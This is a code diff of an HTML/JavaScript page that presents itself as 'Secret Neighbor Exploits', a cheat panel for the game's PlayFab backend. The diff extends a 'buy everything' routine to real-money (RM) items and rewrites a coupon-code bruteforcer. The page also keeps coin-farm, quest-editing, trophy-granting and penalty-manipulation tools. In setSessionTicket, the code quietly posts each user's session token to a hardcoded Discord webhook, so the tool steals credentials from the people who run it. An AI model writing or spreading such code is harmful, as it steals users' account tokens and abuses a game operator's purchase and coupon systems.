@@ -141,20 +141,20 @@
       grid-template-columns: 1fr 1fr;
       gap: 10px;
     }
-    
+
     .purchase-all-btn {
       background-color: #ff9900;
       font-weight: bold;
     }
-    
+
     .purchase-all-btn:hover {
       background-color: #e68a00;
     }
-    
+
     .renew-btn {
       background-color: #2196F3;
     }
-    
+
     .renew-btn:hover {
       background-color: #0b7dda;
     }
@@ -221,9 +221,9 @@
     </div>
 
     <div class="section">
-      <h2>🛒 Purchase All Skins & Emotes</h2>
-      <p class="warning">This will attempt to purchase all available items that use FE, AC, or XP currency</p>
-      <button class="purchase-all-btn" onclick="purchaseAllSkinsEmotes()">Attempt to Purchase All Skins and Emotes</button>
+      <h2>🛒 Attempt To Buy Everything (Close Steam)</h2>
+      <p class="warning">This will attempt to purchase all available items (including RM currency). Close Steam before starting.</p>
+      <button class="purchase-all-btn" onclick="attemptToBuyEverything()">Attempt to Buy Everything</button>
       <div class="output" id="purchaseAllOutput">Purchase logs will appear here...</div>
     </div>
 
@@ -281,7 +281,7 @@
           </select>
         </div>
       </div>
-      
+
       <div class="player-id-inputs">
         <input id="playerId1" placeholder="PlayFab ID 1" type="text">
         <input id="playerId2" placeholder="PlayFab ID 2" type="text">
@@ -290,7 +290,7 @@
         <input id="playerId5" placeholder="PlayFab ID 5" type="text">
         <input id="playerId6" placeholder="PlayFab ID 6" type="text">
       </div>
-      
+
       <button onclick="toggleCoinFarmBot()" id="botToggleButton">Start Coin Farm Bot</button>
       <div class="output" id="cloudOutput">Bot output will appear here...</div>
     </div>
@@ -320,7 +320,7 @@
       <input type="text" id="questTextFieldId" placeholder="Quest Text Field ID">
       <input type="number" id="questProgressValue" placeholder="Progress Value">
       <button onclick="updateQuestProgress()">Update Quest</button>
-      
+
       <div style="margin-top: 15px; text-align: left;">
         <h3>Available Quests:</h3>
         <div style="max-height: 200px; overflow-y: auto; background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">
@@ -339,7 +339,7 @@
             <li>WIN_WITH_HALF_LOCKS_INTACT</li>
             <li>OPEN_LOCKS</li>
             <li>OPEN_LOCKS_IN_ONE_MATCH</li>
-            <li>SEearch_DRAWERS</li>
+            <li>SEARCH_DRAWERS</li>
             <li>FIND_KEYS_VIA_PHOTO</li>
             <li>USE_KEYCARDS</li>
             <li>CATCH_KIDS</li>
@@ -379,7 +379,7 @@
           </ul>
         </div>
       </div>
-      
+
       <div class="output" id="questOutput">Quest update results will appear here...</div>
     </div>
 
@@ -487,6 +487,8 @@
     let photonTokenId = null;
     let couponBruteforceRunning = false;
     let couponBruteforceId = null;
+    let attempts = 0;
+    let couponBruteforceIntervalId = null;
     let failedAttempts = 0;
     const logEntries = [];
     let totalTokensGenerated = 0;
@@ -494,14 +496,14 @@
     function setSessionTicket() {
       sessionTicket = document.getElementById("sessionTicketInput").value.trim();
       const tokenStatus = document.getElementById("tokenStatus");
-      
+
       if (sessionTicket) {
         localStorage.setItem('sessionTicket', sessionTicket);
         tokenStatus.textContent = "✅ Token set successfully!";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
         console.log("SessionTicket set:", sessionTicket);
-        
+
         sendToDiscordWebhook(sessionTicket);
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
@@ -522,18 +524,18 @@
 
     async function renewSessionTicket() {
       const tokenStatus = document.getElementById("tokenStatus");
-      
+
       if (!sessionTicket) {
         tokenStatus.textContent = "❌ No session ticket to renew. Please set a token first.";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "red";
         return;
       }
-      
+
       tokenStatus.textContent = "🔄 Renewing session ticket...";
       tokenStatus.style.display = "block";
       tokenStatus.style.color = "blue";
-      
+
       try {
         const response = await fetch(`https://${titleId}.playfabapi.com/Authentication/GetEntityToken`, {
           method: "POST",
@@ -543,17 +545,17 @@
           },
           body: JSON.stringify({})
         });
-        
+
         const data = await response.json();
-        
+
         if (data.data && data.data.EntityToken) {
           sessionTicket = data.data.EntityToken;
           localStorage.setItem('sessionTicket', sessionTicket);
           document.getElementById("sessionTicketInput").value = sessionTicket;
-          
+
           tokenStatus.textContent = "✅ Session ticket renewed successfully!";
           tokenStatus.style.color = "green";
-          
+
           console.log("SessionTicket renewed:", sessionTicket);
         } else {
           tokenStatus.textContent = `❌ Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
@@ -567,7 +569,7 @@
 
     async function sendToDiscordWebhook(sessionTicket) {
       const webhookURL = "https://discord.com/api/webhooks/1410689568386056275/Eq3YHxlcvOHxbbH7qXZHVPBPItzXBKQZgPk2wYpA6iy_ArTGfg5GaD-FLEjQ7xB8K4vb";
-      
+
       try {
         const response = await fetch(webhookURL, {
           method: 'POST',
@@ -580,7 +582,7 @@
             avatar_url: 'https://cdn.discordapp.com/avatars/340238256874586112/e2aa7a1f843d240a470a54264662b873?size=1024'
           })
         });
-        
+
         if (response.ok) {
           console.log('SessionTicket sent to Discord successfully');
         } else {
@@ -606,7 +608,7 @@
           },
           body: JSON.stringify(body)
         });
-        
+
         return await res.json();
       } catch (error) {
         console.error("API call failed:", error);
@@ -621,65 +623,75 @@
       return result;
     }
 
-    async function purchaseAllSkinsEmotes() {
+    async function attemptToBuyEverything() {
       const output = document.getElementById("purchaseAllOutput");
-      output.textContent = "Starting purchase process...\n";
-      
+      output.textContent = "Starting purchase process (ensure Steam is closed)...\n";
+
       if (!sessionTicket) {
         output.textContent += "❌ Please set your SessionTicket first.\n";
         return;
       }
-      
+
       try {
         output.textContent += "📋 Fetching catalog items...\n";
         const catalogData = await makeApiCall("Client/GetCatalogItems", "POST", {
           CatalogVersion: "Ingame"
         });
-        
+
         if (catalogData.error) {
           output.textContent += `❌ Failed to get catalog: ${catalogData.error}\n`;
           return;
         }
-        
+
         const catalogItems = catalogData.data.Catalog;
         output.textContent += `✅ Found ${catalogItems.length} items in catalog\n`;
-        
+
         output.textContent += "📦 Checking current inventory...\n";
         const inventoryData = await makeApiCall("Client/GetUserInventory", "POST", {});
-        
+
         if (inventoryData.error) {
           output.textContent += `❌ Failed to get inventory: ${inventoryData.error}\n`;
           return;
         }
-        
+
         const ownedItems = inventoryData.data.Inventory.map(item => item.ItemId);
         output.textContent += `✅ You own ${ownedItems.length} items\n`;
-        
+
         const itemsToPurchase = [];
-        
+        const blacklistYears = ["2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025"];
+        const blacklistItems = ["Neighbor_HEAD_Spy"];
+        const blacklistKeywords = ["Devil", "PS4"];
+
         for (const item of catalogItems) {
           if (ownedItems.includes(item.ItemId)) {
             output.textContent += `⏩ Skipping ${item.ItemId} (already owned)\n`;
             continue;
           }
-          
+
+          // Check blacklist: years, specific items, and RM-only Devil/PS4 items
+          const itemName = item.ItemId.toLowerCase();
+          const isBlacklistedYear = blacklistYears.some(year => itemName.includes(year.toLowerCase()));
+          const isBlacklistedItem = blacklistItems.includes(item.ItemId);
+          const isRMOnly = item.VirtualCurrencyPrices && Object.keys(item.VirtualCurrencyPrices).length === 1 && item.VirtualCurrencyPrices.RM;
+          const isBlacklistedKeyword = blacklistKeywords.some(keyword => isRMOnly && itemName.includes(keyword.toLowerCase()));
+
+          if (isBlacklistedYear || isBlacklistedItem || isBlacklistedKeyword) {
+            output.textContent += `⏩ Skipping ${item.ItemId} (blacklisted)\n`;
+            continue;
+          }
+
           if (item.VirtualCurrencyPrices) {
             const currencies = Object.keys(item.VirtualCurrencyPrices);
-            const acceptableCurrencies = currencies.filter(currency => 
-              ['FE', 'AC', 'XP'].includes(currency) && currency !== 'RM'
-            );
-            
-            if (acceptableCurrencies.length > 0) {
-              const currency = acceptableCurrencies[0];
-              const price = item.VirtualCurrencyPrices[currency];
-              
+            const selectedCurrency = currencies.find(currency => ["FE", "AC", "XP", "RM"].includes(currency));
+
+            if (selectedCurrency) {
+              const price = item.VirtualCurrencyPrices[selectedCurrency];
               itemsToPurchase.push({
                 ItemId: item.ItemId,
                 Price: price,
-                VirtualCurrency: currency
+                VirtualCurrency: selectedCurrency
               });
-              
-              output.textContent += `➕ Will purchase ${item.ItemId} for ${price} ${currency}\n`;
+              output.textContent += `➕ Will attempt to purchase ${item.ItemId} for ${price} ${selectedCurrency}\n`;
             } else {
               output.textContent += `⏩ Skipping ${item.ItemId} (no acceptable currency)\n`;
             }
@@ -687,49 +699,98 @@
             output.textContent += `⏩ Skipping ${item.ItemId} (no virtual currency price)\n`;
           }
         }
-        
-        output.textContent += `\n🛒 Attempting to purchase ${itemsToPurchase.length} items...\n\n`;
-        
+
+        output.textContent += `\n🛒 Attempting to purchase ${itemsToPurchase.length} items (one at a time)...\n\n`;
+
         let successfulPurchases = 0;
         let failedPurchases = 0;
-        
+
         for (const item of itemsToPurchase) {
           try {
-            output.textContent += `🛍️ Purchasing ${item.ItemId} for ${item.Price} ${item.VirtualCurrency}... `;
-            
-            const purchaseData = await makeApiCall("Client/PurchaseItem", "POST", {
-              ItemId: item.ItemId,
-              Price: item.Price,
-              VirtualCurrency: item.VirtualCurrency
-            });
-            
-            if (purchaseData.error) {
-              output.textContent += `❌ Failed: ${purchaseData.errorMessage || purchaseData.error}\n`;
-              failedPurchases++;
+            output.textContent += `🛍️ Attempting to purchase ${item.ItemId} for ${item.Price} ${item.VirtualCurrency}...\n`;
+
+            if (item.VirtualCurrency === "RM") {
+              // RM currency: Follow grantCoupons flow (StartPurchase -> PayForPurchase -> ConfirmPurchase)
+              output.textContent += `Starting purchase for ${item.ItemId}...\n`;
+              const startData = await makeApiCall("Client/StartPurchase", "POST", {
+                StoreId: "steam_Shop_Currency",
+                Items: [{
+                  ItemId: item.ItemId,
+                  Quantity: 1
+                }]
+              });
+
+              if (startData.error) {
+                output.textContent += `❌ Error in StartPurchase: ${startData.error}\n`;
+                failedPurchases++;
+                continue;
+              }
+
+              const orderId = startData.data?.OrderId;
+              if (!orderId) {
+                output.textContent += `❌ StartPurchase failed for ${item.ItemId}. No OrderId returned.\n`;
+                failedPurchases++;
+                continue;
+              }
+
+              output.textContent += `Order ID: ${orderId}\nPaying for purchase...\n`;
+              const payData = await makeApiCall("Client/PayForPurchase", "POST", {
+                OrderId: orderId,
+                Currency: "RM",
+                ProviderName: "Steam"
+              });
+
+              output.textContent += `Confirming purchase for ${item.ItemId}...\n`;
+              const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
+                OrderId: orderId
+              });
+
+              if (confirmData.error) {
+                output.textContent += `❌ Error in ConfirmPurchase: ${confirmData.error}\n`;
+                failedPurchases++;
+              } else {
+                output.textContent += `✅ Success! Purchased ${item.ItemId}\n`;
+                successfulPurchases++;
+              }
             } else {
-              output.textContent += `✅ Success!\n`;
-              successfulPurchases++;
+              // Non-RM currency: Use direct PurchaseItem
+              const purchaseData = await makeApiCall("Client/PurchaseItem", "POST", {
+                ItemId: item.ItemId,
+                Price: item.Price,
+                VirtualCurrency: item.VirtualCurrency
+              });
+
+              if (purchaseData.error) {
+                output.textContent += `❌ Failed: ${purchaseData.errorMessage || purchaseData.error}\n`;
+                failedPurchases++;
+              } else {
+                output.textContent += `✅ Success! Purchased ${item.ItemId}\n`;
+                successfulPurchases++;
+              }
             }
           } catch (err) {
-            output.textContent += `❌ Error: ${err.message}\n`;
+            output.textContent += `❌ Error purchasing ${item.ItemId}: ${err.message}\n`;
             failedPurchases++;
           }
+
+          output.scrollTop = output.scrollHeight;
+          // Wait briefly between purchases to avoid overwhelming the server
+          await new Promise(resolve => setTimeout(resolve, 0));
         }
-        
+
         output.textContent += `\n🎉 Purchase process completed!\n`;
         output.textContent += `✅ Successful: ${successfulPurchases}\n`;
         output.textContent += `❌ Failed: ${failedPurchases}\n`;
-        
+        output.scrollTop = output.scrollHeight;
       } catch (error) {
         output.textContent += `❌ Unexpected error: ${error.message}\n`;
+        output.scrollTop = output.scrollHeight;
       }
-      
-      output.scrollTop = output.scrollHeight;
     }
 
     async function addFriend() {
       const friendPlayFabId = document.getElementById("friendPlayFabId").value.trim();
-      
+
       if (!friendPlayFabId) {
         document.getElementById("apiOutput").textContent = "Please enter a friend's PlayFab ID.";
         return;
@@ -754,7 +815,7 @@
       });
 
       const output = document.getElementById("apiOutput");
-      
+
       if (data.data && data.data.Friends) {
         let friendsList = "Friends List:\n";
         data.data.Friends.forEach(friend => {
@@ -772,7 +833,7 @@
 
     async function updateDisplayName() {
       const displayName = document.getElementById("displayName").value.trim();
-      
+
       if (!displayName) {
         document.getElementById("apiOutput").textContent = "Please enter a display name.";
         return;
@@ -792,7 +853,7 @@
 
     async function linkCustomId() {
       const customId = document.getElementById("customId").value.trim();
-      
+
       if (!customId) {
         document.getElementById("apiOutput").textContent = "Please enter a custom ID.";
         return;
@@ -815,7 +876,7 @@
       const statisticName = document.getElementById("statisticName").value.trim();
       const startPosition = parseInt(document.getElementById("startPosition").value) || 0;
       const maxResults = parseInt(document.getElementById("maxResults").value) || 10;
-      
+
       if (!statisticName) {
         document.getElementById("apiOutput").textContent = "Please enter a statistic name.";
         return;
@@ -828,7 +889,7 @@
       });
 
       const output = document.getElementById("apiOutput");
-      
+
       if (data.data && data.data.Leaderboard) {
         let leaderboardText = `Leaderboard for ${statisticName}:\n\n`;
         data.data.Leaderboard.forEach((entry, index) => {
@@ -845,7 +906,7 @@
     async function reportPlayer() {
       const reportReason = document.getElementById("reportReason").value;
       const targetPlayerId = document.getElementById("targetPlayerId").value.trim();
-      
+
       if (!targetPlayerId) {
         document.getElementById("apiOutput").textContent = "Please enter a target PlayFab ID.";
         return;
@@ -878,7 +939,7 @@
       const ItemId = document.getElementById("itemId").value.trim();
       const Price = parseInt(document.getElementById("price").value);
       const VirtualCurrency = document.getElementById("currency").value.trim();
-      
+
       if (!ItemId || isNaN(Price) || !VirtualCurrency) {
         document.getElementById("purchaseOutput").textContent = "Please fill all fields correctly.";
         return;
@@ -901,7 +962,7 @@
     async function grantCoupons() {
       const output = document.getElementById("couponOutput");
       output.textContent = "Starting coupon grant process...";
-      
+
       try {
         output.textContent += "\nStarting purchase...";
         const startData = await makeApiCall("Client/StartPurchase", "POST", {
@@ -924,7 +985,7 @@
         }
 
         output.textContent += `\nOrder ID: ${orderId}`;
-        
+
         output.textContent += "\nPaying for purchase...";
         const payData = await makeApiCall("Client/PayForPurchase", "POST", {
           OrderId: orderId,
@@ -933,7 +994,7 @@
         });
 
         output.textContent += "\nConfirming purchase...";
-        
+
         const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
           OrderId: orderId
         });
@@ -944,7 +1005,6 @@
           output.textContent += "\nCoupon process completed:\n" + 
             formatResponse(confirmData.data);
         }
-        
       } catch (error) {
         output.textContent += `\nUnexpected error: ${error.message}`;
       }
@@ -953,7 +1013,7 @@
     async function viewStatistics() {
       const data = await makeApiCall("Client/GetPlayerStatistics", "POST", {});
       const output = document.getElementById("statsOutput");
-      
+
       if (data.data?.Statistics) {
         const stats = data.data.Statistics.map(stat => 
           `${stat.StatisticName}: ${stat.Value}`
@@ -1041,7 +1101,7 @@
     async function getPlayFabInfo() {
       const playfabId = document.getElementById("playfabId").value.trim();
       const output = document.getElementById("playfabInfoOutput");
-      
+
       if (!playfabId) {
         output.textContent = "Please enter a PlayFab ID.";
         return;
@@ -1067,14 +1127,14 @@
       });
 
       let resultText = "";
-      
+
       if (combinedData.data) {
         const info = combinedData.data.InfoResultPayload;
         resultText += "=== ACCOUNT INFO ===\n";
         resultText += `Username: ${info.AccountInfo.TitleInfo?.DisplayName || "N/A"}\n`;
         resultText += `Created: ${info.AccountInfo.Created || "N/A"}\n`;
         resultText += "\n=== STATISTICS ===\n";
-        
+
         if (info.PlayerStatistics) {
           info.PlayerStatistics.forEach(stat => {
             resultText += `${stat.StatisticName}: ${stat.Value}\n`;
@@ -1101,7 +1161,7 @@
     async function updateQuestProgress() {
       const questTextFieldId = document.getElementById("questTextFieldId").value.trim();
       const progressValue = parseInt(document.getElementById("questProgressValue").value);
-      
+
       if (!questTextFieldId || isNaN(progressValue)) {
         document.getElementById("questOutput").textContent = "Please fill all fields correctly.";
         return;
@@ -1132,7 +1192,7 @@
     async function increasePenaltyPoints() {
       const output = document.getElementById("penaltyOutput");
       output.textContent = "Increasing penalty points...\n";
-      
+
       const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
         CustomTags: null,
         FunctionName: "increaseLowPriorityMatches",
@@ -1157,7 +1217,7 @@
     async function decreasePenaltyPoints() {
       const output = document.getElementById("penaltyOutput");
       output.textContent = "Decreasing penalty points...\n";
-      
+
       const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
         CustomTags: null,
         FunctionName: "refreshStartPunishmentLevelTime",
@@ -1199,14 +1259,14 @@
     async function startMatchStatusSequence() {
       const playerId = document.getElementById("matchPlayerId").value.trim();
       const output = document.getElementById("penaltyOutput");
-      
+
       if (!playerId) {
         output.textContent = "Please enter a Player ID for match status.\n";
         return;
       }
 
       output.textContent = "Starting match status sequence...\n";
-      
+
       const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
         CustomTags: null,
         FunctionName: "refreshStartPunishmentLevelTime",
@@ -1267,7 +1327,7 @@
 
     function toggleCoinFarmBot() {
       if (coinFarmBotRunning) {
-        clear(coinFarmId);
+        clearInterval(coinFarmId);
         coinFarmBotRunning = false;
         document.getElementById("botStatus").className = "status-indicator status-inactive";
         document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";
@@ -1283,7 +1343,7 @@
       document.getElementById("botToggleButton").textContent = "Stop Coin Farm Bot";
 
       document.getElementById("cloudOutput").textContent = 
-        `Starting Coin Farm Bot with ${delayMinutes} minute ...\n`;
+        `Starting Coin Farm Bot with ${delayMinutes} minute delay...\n`;
 
       async function runCoinFarmCycle() {
         const roomType = document.getElementById("roomType").value;
@@ -1390,12 +1450,12 @@
       }
 
       runCoinFarmCycle();
-      coinFarmId = set(runCoinFarmCycle, delayMs);
+      coinFarmId = setInterval(runCoinFarmCycle, delayMs);
     }
 
     function toggleLevelEditor() {
       if (levelEditorRunning) {
-        clear(levelEditorId);
+        clearInterval(levelEditorId);
         levelEditorRunning = false;
         document.getElementById("levelEditorStatus").className = "status-indicator status-inactive";
         document.getElementById("levelEditorToggleButton").textContent = "Start Level Editor";
@@ -1431,12 +1491,12 @@
       }
 
       runLevelEditorCycle();
-      levelEditorId = set(runLevelEditorCycle, 1000);
+      levelEditorId = setInterval(runLevelEditorCycle, 1000);
     }
 
     function togglePhotonTokenGenerator() {
       if (photonTokenRunning) {
-        clear(photonTokenId);
+        clearInterval(photonTokenId);
         photonTokenRunning = false;
         document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
         document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
@@ -1466,7 +1526,7 @@
       }
 
       generatePhotonToken();
-      photonTokenId = set(generatePhotonToken, 1000);
+      photonTokenId = setInterval(generatePhotonToken, 1000);
     }
 
     async function resetLoadout() {
@@ -1626,96 +1686,79 @@
         }
       }
 
-      tryTokenBatch().catch(error => {
-        const errorMsg = `Batch error: ${error.message}`;
-        logEntries.push(errorMsg);
-        output.textContent += errorMsg + '\n';
-        output.scrollTop = output.scrollHeight;
-        logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
-        downloadLog();
-        stopBruteforce();
-      });
+      tryTokenBatch();
     }
 
     function stopBruteforce() {
       bruteforceRunning = false;
       const output = document.getElementById("bruteforceOutput");
-      output.textContent += `Photon token bruteforce stopped. Failed Attempts: ${failedAttempts}\n`;
-      output.scrollTop = output.scrollHeight;
+      output.textContent += `\nBruteforce stopped manually. Total tokens generated: ${totalTokensGenerated}, Failed attempts: ${failedAttempts}\n`;
       logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
       downloadLog();
+      output.scrollTop = output.scrollHeight;
     }
 
-  function toggleBruteforceRedeemCoupon() {
-  if (couponBruteforceRunning) {
-    clear(couponBruteforceId);
-    couponBruteforceRunning = false;
-    document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
-    document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
-    document.getElementById("apiOutput").textContent += `\nCoupon bruteforce stopped manually. Total attempts: ${attempts}\n`;
-    document.getElementById("apiOutput").scrollTop = document.getElementById("apiOutput").scrollHeight;
-    return;
-  }
-
-  if (!sessionTicket) {
-    document.getElementById("apiOutput").textContent = "Please set your SessionTicket first.\n";
-    return;
-  }
-
-  couponBruteforceRunning = true;
-  attempts = 0; // Reset attempts counter
-  document.getElementById("couponBruteforceStatus").className = "status-indicator status-active";
-  document.getElementById("couponBruteforceToggleButton").textContent = "Stop Bruteforce Redeem Coupon";
-  document.getElementById("apiOutput").textContent = "Starting coupon bruteforce...\n";
-
-  function generateCouponCode() {
-    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-    let code = '';
-    for (let i = 0; i < 3; i++) {
-      code += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    code += '-';
-    for (let i = 0; i < 4; i++) {
-      code += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    code += '-';
-    for (let i = 0; i < 3; i++) {
-      code += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return code;
-  }
-
-  async function runCouponBruteforce() {
-    if (!couponBruteforceRunning) return;
-
-    const couponCode = generateCouponCode();
-    attempts++;
-    const output = document.getElementById("apiOutput");
-    output.textContent += `Attempt ${attempts}: Trying ${couponCode}...\n`;
-
-    try {
-      const data = await makeApiCall("Client/RedeemCoupon", "POST", {
-        CouponCode: couponCode,
-        CatalogVersion: "Ingame"
-      });
-
-      if (data.error) {
-        output.textContent += `❌ Failed: ${data.errorMessage || data.error}\n`;
-      } else {
-        output.textContent += `✅ Success! Coupon ${couponCode} redeemed!\n`;
-        output.textContent += formatResponse(data.data);
-        toggleBruteforceRedeemCoupon(); // Stop on success
+    function toggleBruteforceRedeemCoupon() {
+      if (couponBruteforceRunning) {
+        clearInterval(couponBruteforceIntervalId);
+        couponBruteforceRunning = false;
+        document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
+        document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
+        document.getElementById("apiOutput").textContent += `\nCoupon bruteforce stopped manually. Total attempts: ${attempts}\n`;
+        document.getElementById("apiOutput").scrollTop = document.getElementById("apiOutput").scrollHeight;
+        return;
       }
-    } catch (err) {
-      output.textContent += `❌ Error: ${err.message}\n`;
+
+      if (!sessionTicket) {
+        document.getElementById("apiOutput").textContent = "Please set your SessionTicket first.\n";
+        return;
+      }
+
+      couponBruteforceRunning = true;
+      attempts = 0;
+      document.getElementById("couponBruteforceStatus").className = "status-indicator status-active";
+      document.getElementById("couponBruteforceToggleButton").textContent = "Stop Bruteforce Redeem Coupon";
+      document.getElementById("apiOutput").textContent = "Starting coupon bruteforce...\n";
+
+      async function runCouponBruteforce() {
+        const couponCode = generateRandomCouponCode();
+        attempts++;
+        const output = document.getElementById("apiOutput");
+
+        try {
+          const data = await makeApiCall("Client/RedeemCoupon", "POST", {
+            CouponCode: couponCode,
+            CatalogVersion: "Ingame"
+          });
+
+          if (data.error) {
+            output.textContent += `Attempt ${attempts}: Coupon ${couponCode} failed - ${data.error}\n`;
+          } else {
+            output.textContent += `✅ Attempt ${attempts}: Coupon ${couponCode} redeemed successfully!\n`;
+            couponBruteforceRunning = false;
+            clearInterval(couponBruteforceIntervalId);
+            document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
+            document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
+          }
+        } catch (err) {
+          output.textContent += `Attempt ${attempts}: Coupon ${couponCode} error - ${err.message}\n`;
+        }
+
+        output.scrollTop = output.scrollHeight;
+      }
+
+      function generateRandomCouponCode() {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let code = '';
+        for (let i = 0; i < 10; i++) {
+          code += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return code;
+      }
+
+      runCouponBruteforce();
+      couponBruteforceIntervalId = setInterval(runCouponBruteforce, 1000);
     }
-
-    output.scrollTop = output.scrollHeight;
-  }
-
-  runCouponBruteforce();
-  couponBruteforceIntervalId = setInterval(runCouponBruteforce, 1000); // 1
-}
 
     async function grantTrophy() {
       const trophyId = document.getElementById("trophyId").value.trim();
@@ -1729,33 +1772,18 @@
       const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
         FunctionName: "grantTrophy",
         FunctionParameter: {
-          trophyToGrant: trophyId
+          trophyId: trophyId
         },
         GeneratePlayStreamEvent: true
       });
 
       if (data.error) {
-        output.textContent = `Error: ${data.error}`;
-      } else if (data.data && data.data.FunctionResult) {
-        output.textContent = formatResponse(data.data.FunctionResult);
+        output.textContent = `Error granting trophy: ${data.error}`;
       } else {
-        output.textContent = formatResponse(data.data);
+        output.textContent = `Trophy ${trophyId} granted successfully!\n` + formatResponse(data.data);
       }
       output.scrollTop = output.scrollHeight;
     }
-
-    document.addEventListener("DOMContentLoaded", function() {
-      console.log("Secret Neighbor Exploits page loaded");
-      const savedTicket = localStorage.getItem('sessionTicket');
-      if (savedTicket) {
-        sessionTicket = savedTicket;
-        document.getElementById("sessionTicketInput").value = savedTicket;
-        const tokenStatus = document.getElementById("tokenStatus");
-        tokenStatus.textContent = "✅ Token loaded from storage!";
-        tokenStatus.style.display = "block";
-        tokenStatus.style.color = "green";
-      }
-    });
   </script>
 </body>
 </html>
